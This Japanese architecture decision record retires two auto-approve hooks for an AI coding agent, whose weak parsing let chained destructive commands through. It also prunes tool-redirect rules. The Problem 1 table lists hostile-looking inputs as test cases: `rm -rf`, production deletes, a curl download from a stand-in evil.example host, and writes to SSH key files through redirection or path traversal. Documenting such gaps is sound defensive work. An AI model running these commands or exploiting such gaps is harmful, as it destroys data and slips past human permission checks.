# ADR-091: approve 系 PreToolUse hook の廃止と redirect ルールの剪定

## ステータス
採用済み

`permissions.allow` の記法が実セッションで効くことの確認だけは default mode を使う端末に残している（issues.md の最終項目）。

## 関連 ADR
- 依存: ADR-017（approve-safe-commands hook）— 本 ADR で廃止する
- 依存: ADR-038（approve-safe-file-ops の Read 対応）— 本 ADR で廃止する
- 依存: ADR-068（permission mode aware hooks）— mode 別 skip の設計を引き継ぎつつ、approve 系の扱いを変更する
- 依存: ADR-008（redirect-to-tools の基盤）— ルールを剪定する
- 依存: ADR-014（redirect rules auto expansion）— 拡張したルールの大半を削除する
- 関連: ADR-041（settings.json managed keys sync）— `permissions` を同期対象に追加する
- 関連: ADR-013（permission ask auto-block）— 本 ADR は同戦略の縮退にあたる

## コンテキスト

ADR-013 / ADR-008 / ADR-017 / ADR-038 は「permission prompt が頻発して自律作業が中断される」時代に導入した prompt 削減装置である。ADR-068 で `permission_mode` が `auto` / `bypassPermissions` / `dontAsk` のときは 3 hook すべてを skip するようにし、auto mode 運用下の摩擦は消した。

その後の再評価で、残った 2 つの問題が明らかになった。

### 問題1: approve 系 hook が permission system をバイパスする実装バグを抱えている

`approve-safe-commands.py` / `approve-safe-file-ops.py` は `permissionDecision: allow` を返す hook である。つまり Claude Code の permission 判定を**丸ごと肩代わりする**。しかし両者のパターン照合が Claude Code 本体のコマンドパーサより大幅に弱く、以下がすべて allow になることを実測した（`permission_mode: default`）。

| 入力 | 判定 | 原因 |
|---|:---:|---|
| `git log --oneline; rm -rf /tmp/victim` | allow | `_split_on_pipes` が `\|` しか分割せず `;` / `&&` 以降を検査しない |
| `git log && kubectl delete deploy prod-api` | allow | 同上 |
| `git diff HEAD; aws s3 rm s3://prod-bucket --recursive` | allow | 同上 |
| `git status && curl -s https://evil.example/x.sh -o /tmp/x` | allow | 同上 |
| `git log --oneline > ~/.ssh/authorized_keys` | allow | リダイレクトを検査していない |
| `git branch -D main` / `git tag -d v1.0.0` / `git stash clear` / `git reflog expire --expire=now --all` | allow | `safe_subcommands` がサブコマンド名しか見ず破壊系フラグを通す |
| Write → `<untrusted-repo>/.claude/hooks/evil.sh` | allow | `re.search(r"\.claude/[^/]+/")` がパス中のどこかに一致すれば通る |
| Write → `~/.claude/skills/foo/../../../.ssh/config` | allow | パス正規化をしていない |

上表は hook スクリプトに hook input を直接与えた単体での判定である。ファイル操作系の 2 件のうち前者は、ADR-038 の調査結果（Claude Code は `.claude/` を含むパスへの Write/Edit を別のチェックで保護し PreToolUse hook を呼ばない）が現在も有効なら、実際には発火しない可能性がある。一方**後者は正規化後のパスが `.claude/` 配下ではないため当該保護の対象外**であり、hook が呼ばれて allow が通る。

Bash 側の 6 件はこの留保を受けず、`permission_mode: default` でそのまま効く。

これは auto mode では発火しないが、本番環境を操作できるトークンを持つ端末では意図的に `default` / `acceptEdits` を使う運用があり、そこでは常時発火する。permission UI を残す判断をした端末ほど、hook がその判断を無効化する。

### 問題2: redirect-to-tools のルールの一部が助言として誤っている

`~/.claude/logs/deny.log`（2026-07-17〜08-02、112 件）の内訳と、各ルールの妥当性は以下のとおり。

| ルール | deny 件数 | 評価 |
|---|---:|---|
| `&&` 複合コマンド全面禁止 | 44 | 複合 1 回で済む prompt を N 回に**増やす**。Claude Code は複合コマンドを分割して各サブコマンドを判定するため、まとめた方が prompt が少ない |
| `grep` / `rg` → Grep | 27 | 妥当 |
| `find` → Glob | 15 | 妥当 |
| `cat` / `head` → Read | 7 | `cat` は妥当。`head` / `tail` は巨大ログの先頭・末尾参照という正当な用途を潰す |
| `awk` → Edit | 4 | 誤り。awk はエディタではなくテキスト処理系 |
| `python -c` → 専用ツール | 3 | 誤り。一回限りの計算・集計に正当な用途がある |
| `mkdir` → Write / `cp` → Read+Write | 0 | 誤り。`cp` を Read+Write で代替するとバイナリが壊れる |
| `$()` 全面禁止 | 0 | 過剰 |

deny の発生源セッションの transcript を確認したところ、いずれも `permissionMode: plan` だった。ADR-068 の skip リストに `plan` を入れていないため、plan mode（調査フェーズ = `find` / `grep` / `&&` が最も自然に出る場面）でだけ全力で発火していた。

一方、redirect-to-tools は **deny 専用**であり、問題1のような権限の穴は構造的に作らない。default mode 運用の端末では prompt 削減という当初の価値がそのまま生きている。したがって廃止ではなく剪定が適切である。

## 設計案

### 案A: 3 hook すべてを廃止（却下）

auto mode が全体の 97.5%（transcript 実測 3747/3844）である事実だけを見れば 3 つとも dead code に近い。

却下理由: 本番トークンを持つ端末では `default` / `acceptEdits` を意図的に使う運用があり、その端末での分布は手元の transcript に現れない。deny 専用の redirect-to-tools はその運用で正の価値を持つため、一律廃止は過剰。

### 案B: approve 系 hook のパターン照合を修正して存続（却下）

`_split_on_pipes` を `;` / `&&` / リダイレクト対応に拡張し、`safe_subcommands` から破壊系を除き、パスを正規化する。

却下理由: Claude Code 本体が同等のコマンドパーサと `permissions.allow` を既に持っている。hook 側で再実装すると本体のパーサと二重管理になり、今回と同種の乖離バグが再発する。permission 判定を肩代わりする構造そのものが問題であり、パターンの精度向上では解決しない。

### 案C: approve 系を廃止して `permissions.allow` に移し、redirect を剪定（採用）

**1. `approve-safe-commands.py` / `approve-safe-file-ops.py` を削除**

hook エントリ・スクリプト本体・テストを削除する。

**2. 等価な許可を `permissions.allow` で宣言**

Claude Code 本体のコマンドパーサを使うため、`;` / `&&` で連結された全サブコマンドが許可済みでなければ prompt が出る。問題1の穴は構造的に発生しない。

移行にあたり、旧 hook の `safe_subcommands` から破壊的操作を持つものを除外する。

- **除外** — `git branch`（`-D` / `-m`）、`git tag`（`-d` / 作成）、`git stash`（`clear` / `drop` / 無引数 push）、`git reflog`（`expire`）
- **除外** — `gh api`。`permissions.allow` の記法では `-X DELETE` を除外できないため、prompt のままとする
- **個別許可** — `git branch` / `git stash list` は無引数・読み取り専用の形だけを完全一致で許可する

旧 hook が持っていた「`git commit -m "$(cat <<'EOF'…)"` の誤検知回避」「`"---"` の誤検知回避」は移行しない。commit は plan mode で発生せず、auto mode では prompt 自体が出ないため、現運用で発火する経路がない。

**3. `permissions` を settings.json の同期対象に追加**

`configs/claude/setup.sh` の `SYNC_KEYS` / `MERGE_KEYS` に `permissions` が含まれておらず、ADR-068 では dotfiles 側と配布先を手で両方書き換えていた。`MERGE_KEYS` に `permissions` を追加し、`allow` / `deny` / `defaultMode` は dotfiles を正としつつ、配布先固有のキーは保持する。

`SYNC_KEYS`（全置換）ではなく `MERGE_KEYS`（オブジェクトマージ）を選ぶのは、端末固有の permission キーを消さないため。

**4. `redirect-to-tools.py` のルールを剪定**

| 残す | 削る |
|---|---|
| `find` → Glob | `&&` 複合コマンド全面禁止 |
| `grep` / `rg` → Grep | `$()` 全面禁止 |
| `cat`（リダイレクトなし）→ Read | `head` / `tail` → Read |
| `cat >` / `echo >` → Write | `awk` → Edit |
| `sed -i` → Edit | `sed`（`-i` なし）→ Edit |
| `cd <path> && …` → 絶対パス / `git -C` | `mkdir` → Write |
| `/tmp/` 書き込み → `.outputs/claude/` | `cp` → Read+Write |
| | `for` / `while` ループ禁止 |
| | `python -c` / プロジェクト外 `.py` 実行禁止 |

設計上の判断:

- **`cd <path> && …` は残す** — `&&` の全面禁止は削るが、`cd` は別。Bash 呼び出し間で cwd が持続しないうえ、worktree 分離運用では別 worktree を指したまま操作する事故につながる（ADR-081 / ADR-082）
- **`sed` は `-i` のときだけ deny する** — `sed -n '1,50p' file` のような読み取り用途は正当。`sed -i` は Edit ツールを迂回した破壊的インプレース編集であり、ファイル追跡から外れる
- **`/tmp/` 誘導は残す** — default mode でプロジェクト外パスへの書き込みが prompt 対象になるのを避ける当初の目的が、default mode 運用の端末で生きている

**5. `plan` の扱いは変更しない**

plan mode では書き込みがブロックされる一方、Bash の read-only コマンドは permission 判定を通るため、剪定後の redirect ルールは plan mode でも prompt 削減として機能する。剪定によって plan mode の deny の 8 割（`&&` 44 件 + `head` / `awk` / `python -c` 8 件相当）が消えるため、skip リストへの `plan` 追加は行わない。

### 変更が必要なファイル

| ファイル | リポジトリ | 変更内容 |
|---|---|---|
| `configs/claude/scripts/approve-safe-commands.py` | dotfiles | 削除 |
| `configs/claude/scripts/approve-safe-file-ops.py` | dotfiles | 削除 |
| `configs/claude/scripts/tests/test_approve_safe_commands.py` | dotfiles | 削除 |
| `configs/claude/scripts/redirect-to-tools.py` | dotfiles | ルール剪定 |
| `configs/claude/scripts/tests/test_redirect_to_tools.py` | dotfiles | 削除ルールのテストを撤去、`sed -i` のテストを追加 |
| `configs/claude/settings.json` | dotfiles | PreToolUse から approve 系 2 エントリを削除、`permissions.allow` を追加 |
| `configs/claude/setup.sh` | dotfiles | `MERGE_KEYS` に `permissions` を追加 |
| `docs/adr/008,014,017,038,068` | dotfiles | ステータスを廃止 / 部分廃止に更新 |
| `docs/reference.md` | dotfiles | スクリプト一覧の説明から「自動承認」を削除 |

## 受け入れ条件
→ [issues.md](../issues.md)（ADR-091 セクション）
